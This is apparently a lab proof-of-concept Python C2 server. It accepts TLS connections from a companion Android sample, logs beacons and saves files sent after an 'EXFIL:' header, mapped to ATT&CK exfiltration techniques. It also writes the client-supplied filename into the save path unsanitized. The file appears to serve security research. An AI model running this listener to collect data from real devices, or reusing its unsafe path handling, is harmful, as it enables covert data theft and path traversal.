"""
PoC-only TLS listener under my own control — the C2 endpoint the poc-apk
PoC connects to. Implements the server side of ATT&CK Mobile T1521
(Encrypted Channel) and T1646 (Exfiltration Over C2 Channel):
https://attack.mitre.org/techniques/T1521/
https://attack.mitre.org/techniques/T1646/

Lab-only. Never expose this outside an isolated network. Logs every
connection and any received file for evidence capture.

Usage:
    python server.py --host 0.0.0.0 --port 8443 \
        --cert lab_cert.pem --key lab_key.pem

Generate a self-signed lab cert first with generate_cert.sh (never commit
the generated cert/key — see .gitignore).
"""

import argparse
import datetime
import logging
import socket
import ssl
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("poc-c2-server")

RECEIVED_DIR = Path(__file__).parent / "received"
CHUNK_SIZE = 4096


def handle_client(conn: ssl.SSLSocket, addr) -> None:
    log.info("connection_open peer=%s", addr)
    try:
        header = conn.recv(1024).decode("utf-8", errors="replace").strip()
        log.info("beacon peer=%s payload=%s", addr, header)

        if header.startswith("EXFIL:"):
            filename = header.split(":", 1)[1] or "dummy_sensitive_file.txt"
            RECEIVED_DIR.mkdir(exist_ok=True)
            dest = RECEIVED_DIR / f"{datetime.datetime.utcnow():%Y%m%dT%H%M%SZ}_{filename}"
            total = 0
            with dest.open("wb") as f:
                while chunk := conn.recv(CHUNK_SIZE):
                    f.write(chunk)
                    total += len(chunk)
            log.info(
                "exfil_received peer=%s file=%s bytes=%d saved_to=%s",
                addr, filename, total, dest,
            )
    except (ssl.SSLError, ConnectionError) as e:
        log.warning("connection_error peer=%s error=%s", addr, e)
    finally:
        conn.close()
        log.info("connection_close peer=%s", addr)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--cert", default="lab_cert.pem")
    parser.add_argument("--key", default="lab_key.pem")
    args = parser.parse_args()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=args.cert, keyfile=args.key)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((args.host, args.port))
        sock.listen(5)
        log.info("listening host=%s port=%d", args.host, args.port)

        with context.wrap_socket(sock, server_side=True) as tls_sock:
            while True:
                try:
                    conn, addr = tls_sock.accept()
                except ssl.SSLError as e:
                    log.warning("tls_handshake_error error=%s", e)
                    continue
                handle_client(conn, addr)


if __name__ == "__main__":
    main()
